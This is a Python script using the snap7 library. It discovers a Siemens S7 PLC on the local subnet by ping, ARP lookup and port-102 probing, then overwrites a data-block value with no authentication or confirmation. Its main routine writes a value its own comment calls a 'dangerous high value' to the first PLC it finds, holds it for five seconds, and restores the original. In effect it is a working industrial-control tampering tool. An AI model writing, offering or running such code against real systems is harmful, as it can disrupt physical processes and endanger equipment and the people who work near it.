import snap7
import socket
import struct
import time
import subprocess  # For finding IP address


def find_plc_ip():
    """
    Attempts to find the PLC's IP address on the local network.
    This method relies on pinging the broadcast address and checking ARP table.
    Requires administrator privileges to execute correctly.

    Returns:
        str: The PLC's IP address if found, otherwise None.
    """

    try:
        # 1. Get local machine's IP and subnet mask
        local_ip = socket.gethostbyname(socket.gethostname())
        # Extract the network address.  This is a simplification.  A robust solution
        # would need to handle multiple network interfaces and different subnet masks correctly.
        network_address = '.'.join(local_ip.split('.')[:3]) + '.0'

        # 2. Ping the broadcast address (requires administrator privileges)
        # This is simplified and might need adjustments based on the OS.
        broadcast_address = '.'.join(local_ip.split('.')[:3]) + '.255'  # Assumes /24 subnet
        # Replace this with a more robust method if needed.  Using nmap would be better, but requires an nmap installation
        # and appropriate permissions.
        try:
            subprocess.run(['ping', '-n', '1', broadcast_address], check=True, capture_output=True)
        except subprocess.CalledProcessError:
            print("Warning: Ping to broadcast address failed.  Ensure you have administrator privileges.")
            return None

        # 3. Check the ARP table for responses
        try:
            arp_output = subprocess.check_output(['arp', '-a']).decode('utf-8')
            for line in arp_output.splitlines():
                if network_address in line and "dynamic" in line:  #look for ip on same subnet
                    parts = line.split()
                    ip_address = parts[1] #get the IP address.
                    #Check that the ip address is likely to be a PLC by testing connectivity
                    # this is a basic test only
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1) #only wait 1 second to connect
                        s.connect((ip_address, 102))  # S7 port is 102
                        s.close()
                        print(f"Found potential PLC IP: {ip_address}")
                        return ip_address
                    except socket.error as e:
                        print(f"Connection to {ip_address} failed: {e}")
                        pass #it's not a PLC so continue the loop.

        except FileNotFoundError:
            print("arp command not found.")
            return None
        except subprocess.CalledProcessError:
            print("Error running arp command.  Ensure you have sufficient permissions.")
            return None


        print("No PLC IP address found on the network using ARP and PING")
        return None

    except Exception as e:
        print(f"Error finding PLC IP: {e}")
        return None


def modify_plc_parameter(plc_ip, rack, slot, db_number, offset, data_type, new_value):
    """
    Modifies a parameter in a Siemens S7-1200 PLC's data block.

    Args:
        plc_ip (str): The IP address of the PLC.
        rack (int): The PLC rack number (usually 0).
        slot (int): The PLC slot number (usually 1 for S7-1200).
        db_number (int): The data block number.
        offset (int): The offset within the data block (in bytes).
        data_type (str): The data type of the parameter to modify ('INT', 'REAL', 'BOOL').  Crucially, this determines how the data is packed.
        new_value (any): The new value to write. Must be compatible with the data type.
    """

    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, rack, slot)

        db = plc.db_read(db_number, offset, get_data_length(data_type))

        # Pack the new value into the byte array
        data = pack_data(data_type, new_value)

        #Overwrite data
        db[:len(data)] = data

        # Write the modified data block back to the PLC
        plc.db_write(db_number, offset, db)

        print(f"Successfully modified DB{db_number} at offset {offset} to {new_value} (Type: {data_type}) on PLC {plc_ip}")

    except Exception as e:
        print(f"Error modifying PLC parameter: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()


def get_data_length(data_type):
    """Returns the length of the data in bytes given the datatype."""
    if data_type == 'INT':
        return 2
    elif data_type == 'REAL':
        return 4
    elif data_type == 'BOOL':
        return 1 #bool takes 1 byte.
    else:
        raise ValueError(f"Unsupported data type: {data_type}")


def pack_data(data_type, value):
    """Packs the data according to the specified data type."""
    if data_type == 'INT':
        return struct.pack('>h', value)  # '>h' is for big-endian short (2 bytes)
    elif data_type == 'REAL':
        return struct.pack('>f', value)  # '>f' is for big-endian float (4 bytes)
    elif data_type == 'BOOL':
        # In S7, a BOOL typically occupies a full byte.  We just set the least significant bit.
        if value:
            return struct.pack('B', 1)
        else:
            return struct.pack('B', 0)

    else:
        raise ValueError(f"Unsupported data type: {data_type}")


if __name__ == "__main__":
    # 1. Find the PLC IP address
    plc_ip = find_plc_ip()

    if plc_ip is None:
        print("PLC IP address not found.  Exiting.")
        exit()

    # 2. Configuration (These should be configurable outside the script in a real application!)
    RACK = 0
    SLOT = 1
    DB_NUMBER = 10  # Example Data Block number.  This should exist on the PLC.
    OFFSET = 0      # Example offset within the Data Block
    DATA_TYPE = 'REAL' #Example datatype.
    ORIGINAL_VALUE = 50.0
    MODIFIED_VALUE = 150.0  # Example new value (dangerous high value)

    #3. Print the original value before modification to a log
    print("About to read original value")
    plc = snap7.client.Client()
    plc.connect(plc_ip, RACK, SLOT)
    db = plc.db_read(DB_NUMBER, OFFSET, get_data_length(DATA_TYPE))
    unpacked_value = None
    if DATA_TYPE == "INT":
        unpacked_value = struct.unpack(">h", db[:2])[0]
    elif DATA_TYPE == "REAL":
        unpacked_value = struct.unpack(">f", db[:4])[0]
    elif DATA_TYPE == "BOOL":
        unpacked_value = struct.unpack("B", db[:1])[0]
    print(f"Original value from DB{DB_NUMBER} offset {OFFSET} (Type: {DATA_TYPE}) is {unpacked_value}")
    plc.disconnect()

    #4. Modify the parameter
    modify_plc_parameter(plc_ip, RACK, SLOT, DB_NUMBER, OFFSET, DATA_TYPE, MODIFIED_VALUE)


    #5. Optionally, add a delay and restore the original value
    time.sleep(5)  # Wait for 5 seconds before restoring.  This allows the modified value to take effect.
    modify_plc_parameter(plc_ip, RACK, SLOT, DB_NUMBER, OFFSET, DATA_TYPE, ORIGINAL_VALUE)
    print("Value restored to original")